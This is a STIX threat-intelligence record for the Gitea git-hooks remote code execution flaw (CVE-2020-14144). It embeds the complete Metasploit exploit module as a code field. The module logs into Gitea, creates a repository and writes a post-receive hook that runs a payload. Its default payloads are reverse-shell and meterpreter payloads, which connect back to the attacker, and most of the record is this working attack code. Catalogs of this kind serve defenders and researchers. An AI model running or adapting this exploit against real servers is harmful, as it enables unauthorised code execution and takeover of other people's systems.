{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--a43d03b2-da8c-4c92-ace6-68cdb996e187",
    "created": "2024-08-14T17:09:50.616621Z",
    "modified": "2024-08-14T17:09:50.616624Z",
    "name": "Gitea Git Hooks Remote Code Execution",
    "description": " This module leverages an insecure setting to get remote code execution on the target OS in the context of the user running Gitea. This is possible when the current user is allowed to create `git hooks`, which is the default for administrative users. For non-administrative users, the permission needs to be specifically granted by an administrator.  To achieve code execution, the module authenticates to the Gitea web interface, creates a temporary repository, sets a `post-receive` git hook with the payload and creates a dummy file in the repository. This last action will trigger the git hook and execute the payload. Everything is done through the web interface.  It has been mitigated in version 1.13.0 by setting the Gitea `DISABLE_GIT_HOOKS` configuration setting to `true` by default. This disables this feature and prevents all users (including admin) from creating custom git hooks.  This module has been tested successfully against docker versions 1.12.5 1.12.6 and 1.13.6 with `DISABLE_GIT_HOOKS` set to `false`, and on version 1.12.6 on Windows. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/gitea_git_hooks_rce.rb",
            "external_id": "gitea_git_hooks_rce.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2020-14144"
        },
        {
            "source_name": "reference",
            "url": "https://podalirius.net/articles/exploiting-cve-2020-14144-gitea-authenticated-remote-code-execution/"
        },
        {
            "source_name": "reference",
            "url": "https://www.fzi.de/en/news/news/detail-en/artikel/fsa-2020-3-schwachstelle-in-gitea-1126-und-gogs-0122-ermoeglicht-ausfuehrung-von-code-nach-authent/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n\n  Rank = ExcellentRanking\n\n  prepend Msf::Exploit::Remote::AutoCheck\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Gitea Git Hooks Remote Code Execution',\n        'Description' => %q{\n          This module leverages an insecure setting to get remote code\n          execution on the target OS in the context of the user running Gitea.\n          This is possible when the current user is allowed to create `git\n          hooks`, which is the default for administrative users. For\n          non-administrative users, the permission needs to be specifically\n          granted by an administrator.\n\n          To achieve code execution, the module authenticates to the Gitea web\n          interface, creates a temporary repository, sets a `post-receive` git\n          hook with the payload and creates a dummy file in the repository.\n          This last action will trigger the git hook and execute the payload.\n          Everything is done through the web interface.\n\n          It has been mitigated in version 1.13.0 by setting the Gitea\n          `DISABLE_GIT_HOOKS` configuration setting to `true` by default. This\n          disables this feature and prevents all users (including admin) from\n          creating custom git hooks.\n\n          This module has been tested successfully against docker versions 1.12.5,\n          1.12.6 and 1.13.6 with `DISABLE_GIT_HOOKS` set to `false`, and on\n          version 1.12.6 on Windows.\n        },\n        'Author' => [\n          'Podalirius',             # Original PoC\n          'Christophe De La Fuente' # MSF Module\n        ],\n        'References' => [\n          ['CVE', '2020-14144'],\n          ['EDB', '49571'],\n          ['URL', 'https://podalirius.net/articles/exploiting-cve-2020-14144-gitea-authenticated-remote-code-execution/'],\n          ['URL', 'https://www.fzi.de/en/news/news/detail-en/artikel/fsa-2020-3-schwachstelle-in-gitea-1126-und-gogs-0122-ermoeglicht-ausfuehrung-von-code-nach-authent/']\n        ],\n        'DisclosureDate' => '2020-10-07',\n        'License' => MSF_LICENSE,\n        'Platform' => %w[unix linux win],\n        'Arch' => [ARCH_CMD, ARCH_X86, ARCH_X64],\n        'Privileged' => false,\n        'Targets' => [\n          [\n            'Unix Command',\n            {\n              'Platform' => 'unix',\n              'Arch' => ARCH_CMD,\n              'Type' => :unix_cmd,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'cmd/unix/reverse_bash'\n              }\n            }\n          ],\n          [\n            'Linux Dropper',\n            {\n              'Platform' => 'linux',\n              'Arch' => [ARCH_X86, ARCH_X64],\n              'Type' => :linux_dropper,\n              'DefaultOptions' => {\n                'CMDSTAGER::FLAVOR' => :bourne,\n                'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp'\n              }\n            }\n          ],\n          [\n            'Windows Command',\n            {\n              'Platform' => 'win',\n              'Arch' => ARCH_CMD,\n              'Type' => :win_cmd,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'cmd/windows/powershell_reverse_tcp'\n              }\n            }\n          ],\n          [\n            'Windows Dropper',\n            {\n              'Platform' => 'win',\n              'Arch' => [ARCH_X86, ARCH_X64],\n              'Type' => :win_dropper,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'windows/x64/meterpreter/reverse_tcp'\n              }\n            }\n          ],\n        ],\n        'DefaultOptions' => { 'WfsDelay' => 30 },\n        'DefaultTarget' => 1,\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [ARTIFACTS_ON_DISK, IOC_IN_LOGS]\n        }\n      )\n    )\n\n    register_options([\n      Opt::RPORT(3000),\n      OptString.new('TARGETURI', [true, 'Base path', '/']),\n      OptString.new('USERNAME', [true, 'Username to authenticate with']),\n      OptString.new('PASSWORD', [true, 'Password to use']),\n    ])\n\n    @need_cleanup = false\n  end\n\n  def check\n    res = send_request_cgi(\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path),\n      'keep_cookies' => true\n    )\n    unless res\n      return CheckCode::Unknown('Target did not respond to check.')\n    end\n\n    # Powered by Gitea Version: 1.12.5\n    unless (match = res.body.match(/Gitea Version: (?<version>[\\da-zA-Z.]+)/))\n      return CheckCode::Unknown('Target does not appear to be running Gitea.')\n    end\n\n    if match[:version].match(/[a-zA-Z]/)\n      return CheckCode::Unknown(\"Unknown Gitea version #{match[:version]}.\")\n    end\n\n    if Rex::Version.new(match[:version]) >= Rex::Version.new('1.13.0')\n      print_warning(\n        'This version of Gitea has the \"DISABLE_GIT_HOOKS\" option set to true '\\\n        'by default. This prevents all users (including admin) from creating '\\\n        'custom git hooks. This exploit might not work if this option is still '\\\n        'set to the default value.'\n      )\n    end\n    CheckCode::Appears(\"Gitea version is #{match[:version]}\")\n  end\n\n  def exploit\n    print_status(\"Executing #{target.name} for #{datastore['PAYLOAD']}\")\n\n    print_status(\"Authenticate with \\\"#{datastore['USERNAME']}/#{datastore['PASSWORD']}\\\"\")\n    gitea_login\n    print_good('Logged in')\n\n    @repo_name = [Faker::App.name, Faker::App.name].join('_').gsub(' ', '_')\n    print_status(\"Create repository \\\"#{@repo_name}\\\"\")\n    gitea_create_repo\n    @need_cleanup = true\n    print_good('Repository created')\n\n    case target['Type']\n    when :unix_cmd, :win_cmd\n      execute_command(payload.encoded)\n    when :linux_dropper, :win_dropper\n      execute_cmdstager(background: true, delay: 1)\n    end\n  end\n\n  def execute_command(cmd, _opts = {})\n    vprint_status(\"Executing command: #{cmd}\")\n\n    print_status('Setup post-receive hook with command')\n    gitea_post_receive_hook(cmd)\n    print_good('Git hook setup')\n\n    print_status('Create a dummy file on the repo to trigger the payload')\n    last_chunk = cmd_list ? cmd == cmd_list.last : true\n    gitea_create_file(last_chunk: last_chunk)\n    print_good(\"File created#{', shell incoming...' if last_chunk}\")\n  end\n\n  def http_post_request(uri, opts = {})\n    csrf = opts.delete(:csrf) || get_csrf(uri)\n    timeout = opts.delete(:timeout) || 20\n\n    post_data = { _csrf: csrf }.merge(opts)\n    request_hash = {\n      'method' => 'POST',\n      'uri' => normalize_uri(datastore['TARGETURI'], uri),\n      'ctype' => 'application/x-www-form-urlencoded',\n      'vars_post' => post_data\n    }\n\n    send_request_cgi(request_hash, timeout)\n  end\n\n  def get_csrf(uri)\n    vprint_status('Get \"csrf\" value')\n    res = send_request_cgi(\n      'method' => 'GET',\n      'uri' => normalize_uri(uri),\n      'keep_cookies' => true\n    )\n    unless res\n      fail_with(Failure::Unreachable, 'Unable to get the CSRF token')\n    end\n\n    csrf = extract_value(res, '_csrf')\n    vprint_good(\"csrf=#{csrf}\")\n    csrf\n  end\n\n  def extract_value(res, attr)\n    # <input type=\"hidden\" name=\"_csrf\" value=\"Ix7E3_U_lOt-kZfeMjEll57hZuU6MTYxNzAyMzQwOTEzMjU1MDUwMA\">\n    # <input type=\"hidden\" id=\"uid\" name=\"uid\" value=\"2\" required>\n    # <input type=\"hidden\" name=\"last_commit\" value=\"6a7eb84e9a8e4e76a93ea3aec67b2f70fe2518d2\">\n    unless (match = res.body.match(/<input .*name=\"#{attr}\" +value=\"(?<value>[^\"]+)\".*>/))\n      return fail_with(Failure::NotFound, \"\\\"#{attr}\\\" not found in response\")\n    end\n\n    return match[:value]\n  end\n\n  def gitea_login\n    res = http_post_request(\n      '/user/login',\n      user_name: datastore['USERNAME'],\n      password: datastore['PASSWORD']\n    )\n    unless res\n      fail_with(Failure::Unreachable, 'Unable to reach the login page')\n    end\n\n    unless res.code == 302\n      fail_with(Failure::NoAccess, 'Login failed')\n    end\n\n    nil\n  end\n\n  def gitea_create_repo\n    uri = normalize_uri(datastore['TARGETURI'], '/repo/create')\n\n    res = send_request_cgi('method' => 'GET', 'uri' => uri, 'keep_cookies' => true)\n    unless res\n      fail_with(Failure::Unreachable, \"Unable to reach #{uri}\")\n    end\n\n    vprint_status('Get \"csrf\" and \"uid\" values')\n    csrf = extract_value(res, '_csrf')\n    vprint_good(\"csrf=#{csrf}\")\n    uid = extract_value(res, 'uid')\n    vprint_good(\"uid=#{uid}\")\n\n    res = http_post_request(\n      uri,\n      uid: uid,\n      repo_name: @repo_name,\n      private: 'on',\n      description: '',\n      repo_template: '',\n      issue_labels: '',\n      gitignores: '',\n      license: '',\n      readme: 'Default',\n      auto_init: 'on',\n      default_branch: 'master',\n      csrf: csrf\n    )\n    unless res\n      fail_with(Failure::Unreachable, \"Unable to reach #{uri}\")\n    end\n\n    unless res.code == 302\n      fail_with(Failure::UnexpectedReply, 'Create repository failure')\n    end\n\n    nil\n  end\n\n  def gitea_post_receive_hook(cmd)\n    uri = normalize_uri(datastore['USERNAME'], @repo_name, '/settings/hooks/git/post-receive')\n    shell = <<~SHELL\n      #!/bin/bash\n      #{cmd}&\n      exit 0\n    SHELL\n\n    res = http_post_request(uri, content: shell)\n    unless res\n      fail_with(Failure::Unreachable, \"Unable to reach #{uri}\")\n    end\n\n    unless res.code == 302\n      msg = 'Post-receive hook creation failure'\n      if res.code == 404\n        msg << ' (user is probably not allowed to create Git Hooks)'\n      end\n      fail_with(Failure::UnexpectedReply, msg)\n    end\n\n    nil\n  end\n\n  def gitea_create_file(last_chunk: false)\n    uri = normalize_uri(datastore['USERNAME'], @repo_name, '/_new/master')\n    filename = \"#{Rex::Text.rand_text_alpha(4..8)}.txt\"\n\n    res = send_request_cgi('method' => 'GET', 'uri' => uri, 'keep_cookies' => true)\n    unless res\n      fail_with(Failure::Unreachable, \"Unable to reach #{uri}\")\n    end\n\n    vprint_status('Get \"csrf\" and \"last_commit\" values')\n    csrf = extract_value(res, '_csrf')\n    vprint_good(\"csrf=#{csrf}\")\n    last_commit = extract_value(res, 'last_commit')\n    vprint_good(\"last_commit=#{last_commit}\")\n\n    http_post_request(\n      uri,\n      last_commit: last_commit,\n      tree_path: filename,\n      content: Rex::Text.rand_text_alpha(1..20),\n      commit_summary: '',\n      commit_message: '',\n      commit_choice: 'direct',\n      csrf: csrf,\n      timeout: last_chunk ? 0 : 20 # The last one never returns, don't bother waiting\n    )\n    vprint_status(\"#{filename} created\")\n\n    nil\n  end\n\n  def cleanup\n    super\n    return unless @need_cleanup\n\n    print_status('Cleaning up')\n    uri = normalize_uri(datastore['USERNAME'], @repo_name, '/settings')\n    res = http_post_request(uri, action: 'delete', repo_name: @repo_name)\n\n    unless res\n      fail_with(Failure::Unreachable, 'Unable to reach the settings page')\n    end\n\n    unless res.code == 302\n      fail_with(Failure::UnexpectedReply, 'Delete repository failure')\n    end\n\n    print_status(\"Repository #{@repo_name} deleted.\")\n\n    nil\n  end\nend\n",
    "x_mitre_disclosure_date": "2020-10-07",
    "x_mitre_platforms": [
        "win'"
    ]
}